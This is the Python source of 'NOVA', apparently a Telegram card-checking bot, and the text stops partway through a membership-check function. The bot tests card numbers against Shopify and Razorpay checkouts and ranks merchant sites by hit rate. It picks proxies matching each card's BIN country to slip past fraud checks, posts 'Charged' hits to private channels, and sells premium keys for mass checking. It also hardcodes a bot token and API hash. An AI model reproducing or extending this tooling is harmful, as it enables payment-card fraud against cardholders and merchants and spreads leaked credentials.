# =============================================================================
# NOVA Bot — Complete Single-File Source (v6.4.0)
# =============================================================================
# v6.4.0 changes vs v6.3.0:
#   - /fetshsites N [keyword] — self-contained Shopify store finder
#   - /fetrzsites N [keyword] — Razorpay slug-prober + validator
#   - _fetch_shopify_stores / _fetch_rz_stores helper block
#   - Both commands run on the bot's own container (no external worker)
#   - All modules merged into a single file
# =============================================================================

import os
import re
import json
import time
import random
import string
import hashlib
import logging
import asyncio
import threading
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List

import aiohttp
import aiofiles
from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError, UserNotParticipantError
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


# ====================== API-LESS ENGINES ======================
try:
    from checkout_engine import run_checkout_public, CheckStatus
    CHECKOUT_ENGINE_OK = True
    _CHECKOUT_IMPORT_ERR = None
except Exception as _ce_err:
    CHECKOUT_ENGINE_OK = False
    _CHECKOUT_IMPORT_ERR = _ce_err

try:
    from checkout_engine import is_proxy_alive as _engine_proxy_alive
    ENGINE_PROXY_CHECK_OK = True
except Exception:
    _engine_proxy_alive = None
    ENGINE_PROXY_CHECK_OK = False

try:
    from razorpay_engine import run_razorpay_public as _rz_run_public
    RAZORPAY_ENGINE_OK = True
    _RZ_IMPORT_ERR = None
except Exception as _rz_err:
    RAZORPAY_ENGINE_OK = False
    _rz_run_public = None
    _RZ_IMPORT_ERR = _rz_err

RAZORPAY_ENABLED = True

try:
    from rz_harvester import scan_file as _rz_scan_file, harvest_from_seeds as _rz_harvest
    RZ_HARVESTER_OK = True
    _RZ_HARVEST_ERR = None
except Exception as _rh_err:
    RZ_HARVESTER_OK = False
    _rz_scan_file = None
    _rz_harvest = None
    _RZ_HARVEST_ERR = _rh_err

try:
    from shopify_harvester import (
        scan_file as _sh_scan_file,
        harvest_from_seeds as _sh_harvest,
    )
    SHOPIFY_HARVESTER_OK = True
    _SH_HARVEST_ERR = None
except Exception as _shh_err:
    SHOPIFY_HARVESTER_OK = False
    _sh_scan_file = None
    _sh_harvest = None
    _SH_HARVEST_ERR = _shh_err


# ====================== LOGGING ======================
log = logging.getLogger("NOVA")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s',
                          datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_fmt)
log.addHandler(_ch)

if not os.getenv("RAILWAY_ENVIRONMENT"):
    try:
        _fh = logging.FileHandler('nova_bot.log', encoding='utf-8')
        _fh.setLevel(logging.INFO)
        _fh.setFormatter(_fmt)
        log.addHandler(_fh)
    except Exception:
        pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")


def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper): _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower): _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits): _BOLD_SANS_MAP[_c] = _bold_digits[_i]


def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


def cmd_chip(cmd: str, style: str = "•") -> str:
    return f"<code>{style} {cmd}</code>"


# ====================== CONFIG ======================
API_ID    = int(os.getenv("API_ID") or 33657928)
API_HASH  = os.getenv("API_HASH", "a61fde61442113b9a65c699f7020d59a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8881611682:AAGUaw5qi17Qy3cLGtJwIe6qXoK17WcW_lU")
ADMIN_ID  = [8871910561]

ADMIN_ID_FILE = "admins.json"


def _load_admins():
    global ADMIN_ID
    try:
        if os.path.exists(ADMIN_ID_FILE):
            with open(ADMIN_ID_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                merged = list(dict.fromkeys(
                    list(ADMIN_ID) + [int(x) for x in data if str(x).lstrip('-').isdigit()]
                ))
                ADMIN_ID.clear()
                ADMIN_ID.extend(merged)
    except Exception as e:
        log_system("ADMIN", f"load failed: {e}", "warning")


def _save_admins():
    try:
        with open(ADMIN_ID_FILE, "w", encoding="utf-8") as f:
            json.dump(list(ADMIN_ID), f, indent=2)
    except Exception as e:
        log_system("ADMIN", f"save failed: {e}", "warning")


HIT_CHANNEL_ID          = -1004381920430
CHARGED_ONLY_CHANNEL_ID = -1003965573664
GROUP_CHAT_ID           = -1003902938287
REDEEM_LOG_CHANNEL_ID   = -1003902938287

FORCE_JOIN_GROUP_ID   = -1003902938287
FORCE_JOIN_CHANNEL_ID = -1004381920430

GROUP_INVITE_LINK   = "https://t.me/+_0kBIVQujUEyOTc1"
CHANNEL_INVITE_LINK = "https://t.me/+3dlEoWK-vGcwMDI9"

BOT_BRAND    = "NOVA"
BOT_USERNAME = "@spectrumxchkbot"
OWNER_NAME   = "SUPERGREMLIN"
OWNER_TAG    = "@SUPERGREMLIN01"
DEV_LINE     = f"⌬ {bs('Bot By')} <a href='https://t.me/{OWNER_TAG.lstrip('@')}'>{OWNER_TAG}</a>"
SEP          = "━━━━━━━━━━━━━━━━━"
PE           = "💎"

FREE_DAILY_LIMIT     = 15
FREE_COOLDOWN_SEC    = 10
MAX_PROXIES_PER_USER = 100
DEFAULT_KEY_HOURS    = 24
DEFAULT_KEY_CC_LIMIT = 1500

MIN_PRODUCT_PRICE = 0.01
MAX_PRODUCT_PRICE = 7.00

MASS_HARD_CAP_ADMIN   = 10000
MASS_HARD_CAP_PREMIUM = 5000

PREMIUM_USERS_FILE = "premium_users.json"
USER_PROXIES_FILE  = "user_proxies.json"
KEYS_FILE          = "keys.json"
SITES_FILE         = "sites.txt"
RZ_SITES_FILE      = "rz_sites.txt"
RANK_FILE          = "rank.json"
SETTINGS_FILE      = "settings.json"
PREMIUM_DAILY_FILE = "premium_daily.json"
USER_LIMITS_FILE   = "user_daily_limits.json"
REFERRALS_FILE     = "referrals.json"
STREAKS_FILE       = "streaks.json"
SITE_STATS_FILE    = "site_stats.json"
RZ_LAST_SCAN_FILE      = "rz_sites_last_scan.json"
SHOPIFY_LAST_SCAN_FILE = "shopify_last_scan.json"
WELCOME_FILE_ID_FILE   = os.environ.get("WELCOME_FILE_ID_FILE", ".welcome_file_id.txt")

REFERRAL_MILESTONE_EVERY    = 5
REFERRAL_MILESTONE_HOURS    = 24
REFERRAL_MILESTONE_CC_LIMIT = 5000
REFERRAL_MIN_CHECKS         = 1
REFERRAL_MAX_PER_USER       = 500

STREAK_MIN_GAP_HOURS = 20
STREAK_MAX_GAP_HOURS = 30
STREAK_MILESTONES = {3: 6, 7: 24, 14: 72, 30: 240}

SITE_DISABLE_AFTER_ERRORS   = 10
SITE_MIN_ATTEMPTS_TO_JUDGE  = 20
SITE_TOP_PERCENT            = 0.7

SP_PER_USER_WORKERS      = 70
MSP_PER_USER_WORKERS     = 70
RZ_PER_USER_WORKERS      = 20
MRZ_PER_USER_WORKERS     = 20
SITE_PER_USER_WORKERS    = 70
PROXY_PER_USER_WORKERS   = 70
HARVEST_PER_USER_WORKERS = 70


# ====================== PREMIUM EMOJI ======================
PREMIUM_EMOJI_IDS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","⚠️":"5420323339723881652",
    "⚡":"6174996123522959140","🔥":"5039644681583985437","💎":"5427168083074628963",
    "✔️":"5206607081334906820","✨":"5040016479722931047","🎉":"5039778134807806727",
    "🎯":"5039905162760553480","⛔":"6181277564732972292","🛑":"6181277564732972292",
    "🚨":"5039671744172917707","💰":"5039789890133296083","💳":"5447453226498552490",
    "💲":"5447579253723918909","💵":"5409048419211682843","💸":"5837027045376271166",
    "🏦":"6089185885289454318","🏧":"5447453226498552490","📊":"5042290883949495533",
    "📈":"5039808285478224750","📉":"5039759318556083411","🥇":"6179279816529814743",
    "🥈":"5042036407137207122","🥉":"5039808285478224750","🥔":"5039928501612839813",
    "🧨":"5039778134807806727","🏆":"6089185885289454318","👑":"5039727497143387500",
    "👤":"5992129361090711368","🤖":"6174896506051495705","⚙️":"5445059250382469069",
    "🌐":"6321225560789877992","ℹ️":"5334544901428229844","🏳️":"5256143829672672750",
    "📍":"5391032818111363540","📡":"5447448489149625830","🔔":"5042111805288089118",
    "🛡":"5042328396193864923","🛡️":"5042328396193864923","🔑":"5399885604701880145",
    "🔒":"5445059250382469069","🔓":"5445373981290952548","🔗":"5042101437237036298",
    "🔐":"5445059250382469069","⏰":"5445350406215465190","⏱️":"5445350406215465190",
    "⏱":"5445350406215465190","⌛":"5445350406215465190","🚀":"6174445826543191998",
    "⭐":"5042061201983407048","💫":"5042200814190330758","🔮":"5042302287087666158",
    "💠":"5427168083074628963","🌍":"5447410659077661506","🔰":"5042328396193864923",
    "📧":"5443127283898405358","💀":"5042209657527993345","💯":"5042297717242463211",
    "🚫":"5039671744172917707","😈":"6336664426325740768","📝":"5444889156792646660",
    "📁":"6026239398650056451","🗑":"5039614900280754969","📅":"6168242008277125889",
    "📤":"5445355530111437729","📥":"5443127283898405358","🟢":"5039928501612839813",
    "🔴":"5042042652019655612","🟡":"5042036407137207122","🔵":"5042290883949495533",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⏸":"5042036407137207122","▶️":"5039753786638205957","⏹":"5134537521518085000",
    "🧹":"5039751080808809534","📌":"5397782960512444700","📋":"5445260044398524944",
    "🔧":"5445059250382469069","🔍":"5042302287087666158","💻":"5039579582764680065",
    "📩":"5443127283898405358","💬":"5040036030414062506","📢":"5447644880824181073",
    "📣":"5447644880824181073","💡":"5042264341051605743","🛒":"5445224894386172410",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏠":"5416041192905265756",
    "🏙️":"5447410659077661506","📞":"5443127283898405358","📮":"5444889156792646660",
    "🗺️":"6321225560789877992","↪️":"5445365692004071819","🔙":"5445365692004071819",
    "⬅️":"5445365692004071819","➡️":"5445365692004071819","🎀":"5039953030171067177",
    "🎊":"5039778134807806727","🌟":"5042061201983407048","🔀":"5348386034835015762",
    "🎬":"5445355530111437729","🧠":"6174896506051495705","🖥️":"5039579582764680065",
    "💾":"6026239398650056451","💿":"6026239398650056451","🏓":"5042200814190330758",
    "🎁":"5039778134807806727","🎈":"5039778134807806727","🎨":"5039953030171067177",
    "🌸":"5039953030171067177","🍀":"5039928501612839813","🌙":"5042200814190330758",
    "☀️":"5039808285478224750","🌈":"5256143829672672750","👥":"5443038326535759644",
}


def pe(text):
    if not text:
        return text
    out = text
    for emoji in sorted(PREMIUM_EMOJI_IDS.keys(), key=len, reverse=True):
        doc_id = PREMIUM_EMOJI_IDS[emoji]
        out = out.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return out


# ====================== MESSAGE HELPERS ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons,
                        file=file, link_preview=False), timeout=15)
    except asyncio.TimeoutError:
        return None
    except Exception:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except Exception:
            return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities,
                                         buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except Exception:
        return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities,
                                        buttons=buttons, link_preview=False), timeout=8)
    except Exception:
        pass


async def send_entities(chat_id, html_text, buttons=None, file=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=ents,
            buttons=buttons, link_preview=False, **kwargs)
    except Exception as e:
        log_system("SEND", f"send_entities failed: {e}", "error")
        return None


async def send_file_entities(chat_id, file, html_caption, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_caption)
        return await client_instance.send_file(
            chat_id, file, caption=text, formatting_entities=ents,
            buttons=buttons, **kwargs)
    except Exception as e:
        log_system("SEND_FILE", f"send_file_entities failed: {e}", "error")
        return None


async def edit_entities(msg, html_text, buttons=None, **kwargs):
    try:
        text, ents = build_entities(html_text)
        await msg.edit(text, formatting_entities=ents,
                       buttons=buttons, link_preview=False, **kwargs)
        return True
    except Exception:
        return False


# ====================== BUTTON HELPER ======================
BUTTON_ICONS = {
    "✅":"5278327121008167894","❌":"5785177332595561481","↪️":"5445365692004071819",
    "🔥":"5039644681583985437","⚡":"6174996123522959140","⭐":"5042061201983407048",
    "🚀":"6174445826543191998","⚙️":"5445059250382469069","📡":"5447448489149625830",
    "💫":"5042200814190330758","💎":"5427168083074628963","🌐":"6321225560789877992",
    "⚠️":"5420323339723881652","🛡️":"5042328396193864923","💰":"5039789890133296083",
    "👑":"5039727497143387500","🤖":"6174896506051495705","📋":"5445260044398524944",
    "💳":"5447453226498552490","⏰":"5445350406215465190","💻":"5039579582764680065",
    "🔑":"5399885604701880145","🔓":"5445373981290952548","🔌":"6321225560789877992",
    "🛠️":"5445059250382469069","🔙":"5445365692004071819","🛒":"5445224894386172410",
    "🔴":"5042042652019655612","📁":"6026239398650056451","📥":"5443127283898405358",
    "📢":"5447644880824181073","👥":"5443038326535759644","📩":"5443127283898405358",
    "💬":"5040036030414062506","🥇":"6179279816529814743","🥈":"5042036407137207122",
    "🥉":"5039808285478224750","🥔":"5039928501612839813","🧨":"5039778134807806727",
    "🟢":"5039928501612839813","🔵":"5042290883949495533","🟡":"5042036407137207122",
    "🟠":"5039808285478224750","⚪":"5042061201983407048","⚫":"5042209657527993345",
    "⛔":"6181277564732972292","🛑":"6181277564732972292","🚨":"5039671744172917707",
    "🎯":"5039905162760553480","📊":"5042290883949495533","📈":"5039808285478224750",
    "🏆":"6089185885289454318","👤":"5992129361090711368","📌":"5397782960512444700",
    "🔍":"5042302287087666158","🔧":"5445059250382469069","💡":"5042264341051605743",
    "📝":"5444889156792646660","🗑":"5039614900280754969","📅":"6168242008277125889",
    "🧹":"5039751080808809534","🎉":"5039778134807806727","✨":"5040016479722931047",
    "✔️":"5206607081334906820","🔒":"5445059250382469069","🔐":"5445059250382469069",
    "🌍":"5447410659077661506","📍":"5391032818111363540","🎬":"5445355530111437729",
    "🎀":"5039953030171067177","🎊":"5039778134807806727","🌟":"5042061201983407048",
    "💯":"5042297717242463211","😈":"6336664426325740768","💀":"5042209657527993345",
    "🛍️":"5445224894386172410","📦":"6026239398650056451","🏦":"6089185885289454318",
    "💵":"5409048419211682843","💸":"5837027045376271166","💲":"5447579253723918909",
    "⏱️":"5445350406215465190","⏱":"5445350406215465190","⌛":"5445350406215465190",
    "📤":"5445355530111437729","🔗":"5042101437237036298","💠":"5427168083074628963",
    "🔮":"5042302287087666158","🔀":"5348386034835015762",
}


def pbtn(text, data=None, url=None, style=None, icon=None):
    icon_id = None
    if icon:
        icon_id = BUTTON_ICONS.get(icon)
        if icon_id:
            icon_id = int(icon_id)
    if icon_id is None and text:
        for e, i in BUTTON_ICONS.items():
            if e in text:
                icon_id = int(i)
                break
    clean = text
    if icon and icon in clean:
        clean = clean.replace(icon, '').strip()
    if url:
        try:
            return Button.url(clean, url, style=style)
        except Exception:
            return Button.url(clean, url)
    if data:
        try:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data,
                                 icon=icon_id, style=style)
        except Exception:
            return Button.inline(clean, data.encode() if isinstance(data, str) else data)
    try:
        return Button.inline(clean, b"none", icon=icon_id, style=style)
    except Exception:
        return Button.inline(clean, b"none")


# ====================== JSON STORAGE ======================
def _read_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def _write_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        log_system("FS", f"write {path} failed: {e}", "error")


# ====================== PREMIUM USERS ======================
def load_premium_users() -> dict:
    data = _read_json(PREMIUM_USERS_FILE, None)
    if data is None:
        data = {str(uid): None for uid in ADMIN_ID}
        _write_json(PREMIUM_USERS_FILE, data)
    return data


def save_premium_users(data: dict):
    _write_json(PREMIUM_USERS_FILE, data)


def is_premium(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return False
    expiry = data[uid]
    if expiry is None:
        return True
    info = expiry
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp is None:
            return True
        if datetime.now().timestamp() > float(exp):
            del data[uid]
            save_premium_users(data)
            return False
        return True
    if datetime.now().timestamp() > float(info):
        del data[uid]
        save_premium_users(data)
        return False
    return True


def add_premium(user_id: int, expiry_ts=None, cc_limit=None):
    data = load_premium_users()
    if expiry_ts is None and cc_limit is None:
        data[str(user_id)] = None
    else:
        data[str(user_id)] = {"expiry": expiry_ts, "cc_limit": cc_limit or 100000,
                              "activated_at": datetime.now().isoformat()}
    save_premium_users(data)


def remove_premium(user_id: int) -> bool:
    data = load_premium_users()
    uid = str(user_id)
    if uid in data:
        del data[uid]
        save_premium_users(data)
        return True
    return False


def get_cc_limit(user_id: int) -> int:
    if user_id in ADMIN_ID:
        return 100000
    data = load_premium_users()
    uid = str(user_id)
    if uid not in data:
        return 0
    info = data[uid]
    if info is None:
        return 100000
    if isinstance(info, dict):
        exp = info.get("expiry")
        if exp and datetime.now().timestamp() > float(exp):
            return 0
        return int(info.get("cc_limit", DEFAULT_KEY_CC_LIMIT))
    return 100000


# ====================== PROXIES ======================
def load_user_proxies(user_id: int) -> list:
    data = _read_json(USER_PROXIES_FILE, {})
    return data.get(str(user_id), [])


def save_user_proxies(user_id: int, proxies: list):
    data = _read_json(USER_PROXIES_FILE, {})
    data[str(user_id)] = proxies
    _write_json(USER_PROXIES_FILE, data)


# ====================== SHOPIFY SITES ======================
def load_sites() -> list:
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_sites(sites: list):
    try:
        with open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save sites failed: {e}", "error")


# ====================== RAZORPAY SITES ======================
def load_rz_sites() -> list:
    if not os.path.exists(RZ_SITES_FILE):
        return []
    try:
        with open(RZ_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def save_rz_sites(sites: list):
    try:
        with open(RZ_SITES_FILE, 'w', encoding='utf-8') as f:
            for s in sites:
                f.write(s + "\n")
    except Exception as e:
        log_system("FS", f"save rz sites failed: {e}", "error")


# ====================== WELCOME VIDEO FILE_ID ======================
def get_welcome_file_id() -> Optional[str]:
    if os.path.exists(WELCOME_FILE_ID_FILE):
        try:
            with open(WELCOME_FILE_ID_FILE, "r", encoding="utf-8") as f:
                fid = f.read().strip()
                return fid or None
        except Exception:
            pass
    return None


def set_welcome_file_id(fid: str):
    try:
        with open(WELCOME_FILE_ID_FILE, "w", encoding="utf-8") as f:
            f.write(fid)
    except Exception:
        pass


# ====================== SMART SITES ROTATION ======================
_SITE_STATS_LOCK = threading.Lock()


def load_site_stats() -> dict:
    return _read_json(SITE_STATS_FILE, {})


def save_site_stats(d: dict):
    _write_json(SITE_STATS_FILE, d)


def _site_report(site: str, status: str):
    if not site:
        return
    try:
        with _SITE_STATS_LOCK:
            d = load_site_stats()
            s = d.get(site) or {
                "attempts": 0, "hits": 0, "declined": 0,
                "errors": 0, "last_used": 0, "disabled": False,
            }
            s["attempts"] = int(s.get("attempts", 0)) + 1
            s["last_used"] = time.time()
            if status in ("Charged", "Approved", "3DS"):
                s["hits"] = int(s.get("hits", 0)) + 1
                s["errors"] = 0
            elif status == "Dead":
                s["declined"] = int(s.get("declined", 0)) + 1
            else:
                s["errors"] = int(s.get("errors", 0)) + 1
            if s["attempts"] >= SITE_MIN_ATTEMPTS_TO_JUDGE:
                if s["hits"] == 0 and s["errors"] >= SITE_DISABLE_AFTER_ERRORS:
                    s["disabled"] = True
            d[site] = s
            save_site_stats(d)
    except Exception as e:
        log_system("SITE_STATS", f"report {site}: {e}", "error")


def _site_score(site: str) -> float:
    d = load_site_stats()
    s = d.get(site)
    if not s:
        return 1.0
    if s.get("disabled"):
        return -1.0
    attempts = max(1, int(s.get("attempts", 1)))
    hits = int(s.get("hits", 0))
    errors = int(s.get("errors", 0))
    rate = hits / attempts
    penalty = min(0.5, errors * 0.05)
    return rate - penalty


def _get_active_sites(all_sites: list) -> list:
    if not all_sites:
        return []
    d = load_site_stats()
    scored = []
    for s in all_sites:
        info = d.get(s) or {}
        if info.get("disabled"):
            continue
        scored.append((s, _site_score(s)))
    if not scored:
        for s in all_sites:
            if s in d:
                d[s]["disabled"] = False
                d[s]["errors"] = 0
        save_site_stats(d)
        return all_sites
    scored.sort(key=lambda x: x[1], reverse=True)
    top_n = max(1, int(len(scored) * SITE_TOP_PERCENT))
    top = [s for s, _ in scored[:top_n]]
    bottom = [s for s, _ in scored[top_n:]]
    random.shuffle(top)
    random.shuffle(bottom)
    return top + bottom


# ====================== SMART PROXY ROTATION ======================
_BIN_COUNTRY_CACHE = {}

_COUNTRY_CODES = {
    'US','CA','MX','BR','AR','CL','CO','PE','VE','EC','UY','PY','BO',
    'GB','IE','DE','FR','IT','ES','PT','NL','BE','CH','AT','SE','NO',
    'DK','FI','PL','CZ','HU','RO','GR','RU','UA','TR',
    'AE','SA','QA','KW','BH','OM','JO','LB','IL','EG','MA','DZ','TN',
    'ZA','NG','KE',
    'IN','PK','BD','LK','NP','CN','HK','TW','JP','KR','TH','VN','PH',
    'MY','SG','ID',
    'AU','NZ','FJ',
}

_PROXY_COUNTRY_NEIGHBOURS = {
    'US': ['CA', 'MX'], 'CA': ['US'],
    'GB': ['IE', 'FR', 'DE', 'NL'], 'IE': ['GB'],
    'DE': ['AT', 'CH', 'NL', 'FR', 'PL', 'CZ'], 'AT': ['DE', 'CH'],
    'CH': ['DE', 'FR', 'IT', 'AT'], 'FR': ['BE', 'DE', 'IT', 'ES', 'CH'],
    'IT': ['FR', 'DE', 'CH', 'AT'], 'ES': ['FR', 'PT', 'IT'], 'PT': ['ES'],
    'NL': ['BE', 'DE', 'GB'], 'BE': ['NL', 'FR', 'DE'],
    'AU': ['NZ'], 'NZ': ['AU'],
    'IN': ['PK', 'LK', 'BD'], 'AE': ['SA', 'QA', 'KW', 'BH', 'OM'],
    'SA': ['AE', 'QA', 'KW', 'BH', 'OM'], 'BR': ['AR', 'CL', 'CO'],
    'MX': ['US'], 'RU': ['UA'], 'UA': ['RU'], 'CN': ['HK', 'TW'],
    'HK': ['CN', 'TW'], 'JP': ['KR'], 'KR': ['JP'],
    'TH': ['VN', 'MY', 'SG'], 'VN': ['TH', 'MY', 'SG'],
    'MY': ['SG', 'TH', 'ID'], 'SG': ['MY', 'ID'], 'ID': ['MY', 'SG'],
}


async def _get_bin_country(bin_prefix: str) -> str:
    bin6 = (bin_prefix or '')[:6]
    if not bin6 or len(bin6) < 6 or not bin6.isdigit():
        return ""
    if bin6 in _BIN_COUNTRY_CACHE:
        return _BIN_COUNTRY_CACHE[bin6]
    try:
        session = await get_bin_session()
        async with session.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={'Accept-Version': '3'},
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                cc = ((data.get('country') or {}).get('alpha2') or "").upper()
                _BIN_COUNTRY_CACHE[bin6] = cc
                return cc
    except Exception:
        pass
    _BIN_COUNTRY_CACHE[bin6] = ""
    return ""


def _parse_proxy_country(proxy_line: str) -> str:
    if not proxy_line:
        return ""
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    m = re.search(r'[|#]([A-Z]{2})$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(1)
    return ""


def _strip_country_from_proxy(proxy_line: str) -> str:
    if not proxy_line:
        return proxy_line
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and m.group(1) in _COUNTRY_CODES:
        return m.group(2)
    m = re.search(r'^(.+?)[|#]([A-Z]{2})$', p)
    if m and m.group(2) in _COUNTRY_CODES:
        return m.group(1)
    return p


async def _pick_smart_proxy(card: str, proxies: list) -> Optional[str]:
    if not proxies:
        return None
    bin_country = await _get_bin_country(card.split('|')[0][:6])
    if not bin_country:
        return None
    tagged = {}
    for pr in proxies:
        cc = _parse_proxy_country(pr)
        if cc:
            tagged.setdefault(cc, []).append(pr)
    if not tagged:
        return None
    if bin_country in tagged:
        return random.choice(tagged[bin_country])
    for nb in _PROXY_COUNTRY_NEIGHBOURS.get(bin_country, []):
        if nb in tagged:
            return random.choice(tagged[nb])
    return None


# ====================== KEYS ======================
def load_keys() -> dict:
    return _read_json(KEYS_FILE, {})


def save_keys(keys: dict):
    _write_json(KEYS_FILE, keys)


def generate_key() -> str:
    part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
    return f"NOVA_{part}"


# ====================== RANK ======================
def load_rank() -> dict:
    return _read_json(RANK_FILE, {})


def save_rank(data: dict):
    _write_json(RANK_FILE, data)


def increment_charge_count(user_id: int):
    data = load_rank()
    uid = str(user_id)
    data[uid] = data.get(uid, 0) + 1
    save_rank(data)


def count_successful_checks(user_id: int) -> int:
    rank = load_rank()
    try:
        return int(rank.get(str(user_id), 0))
    except Exception:
        return 0


# ====================== SETTINGS ======================
def load_settings() -> dict:
    return _read_json(SETTINGS_FILE, {
        "maintenance": False,
        "threshold": 7.00,
        "min_price": 0.01,
    })


def save_settings(data: dict):
    _write_json(SETTINGS_FILE, data)


_MAINT_CACHE = {"v": False, "ts": 0.0}


def get_maintenance() -> bool:
    now = time.time()
    if now - _MAINT_CACHE["ts"] < 30:
        return _MAINT_CACHE["v"]
    v = bool(load_settings().get("maintenance", False))
    _MAINT_CACHE["v"] = v
    _MAINT_CACHE["ts"] = now
    return v


def set_maintenance(enabled: bool):
    s = load_settings()
    s["maintenance"] = bool(enabled)
    save_settings(s)
    _MAINT_CACHE["v"] = bool(enabled)
    _MAINT_CACHE["ts"] = time.time()


def get_threshold() -> float:
    return float(load_settings().get("threshold", 7.00))


def set_threshold(val: float):
    s = load_settings()
    s["threshold"] = float(val)
    save_settings(s)


def get_min_price() -> float:
    return float(load_settings().get("min_price", 0.01))


def set_min_price(val: float):
    s = load_settings()
    s["min_price"] = float(val)
    save_settings(s)


# ====================== FORCE-JOIN ======================
FORCE_JOIN_CHATS = [
    (FORCE_JOIN_GROUP_ID,   "Group",   GROUP_INVITE_LINK),
    (FORCE_JOIN_CHANNEL_ID, "Channel", CHANNEL_INVITE_LINK),
]

_JOIN_CACHE = {}
_JOIN_CACHE_TTL = 600


async def _is_in_chat(user_id: int, chat_id: int):
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (
        UserNotParticipantError, ChannelPrivateError,
        ChatAdminRequiredError, UserIdInvalidError,
    )
    if not chat_id:
        return None
    try:
        await client_instance(GetParticipantRequest(channel=chat_id, participant=user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChannelPrivateError, ChatAdminRequiredError):
        log_system("FORCE_JOIN", f"bot cannot verify chat {chat_id}", "warning")
        return None
    except UserIdInvalidError:
        return False
    except Exception as e:
        log_system("FORCE_JOIN", f"unexpected error chat {chat_id}: {e!r}", "warning")
        return None


async def is_user_joined(user_id: int) -> bool:
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached_at = _JOIN_CACHE.get(user_id)
    if cached_at and now - cached_at < _JOIN_CACHE_TTL:
        return True
    results = await asyncio.gather(
        _is_in_chat(user_id, FORCE_JOIN_CHATS[0][0]),
        _is_in_chat(user_id, FORCE_JOIN_CHATS[1][0]),
        return_exceptions=True,
    )
    for r in results:
        if r is False:
            return False
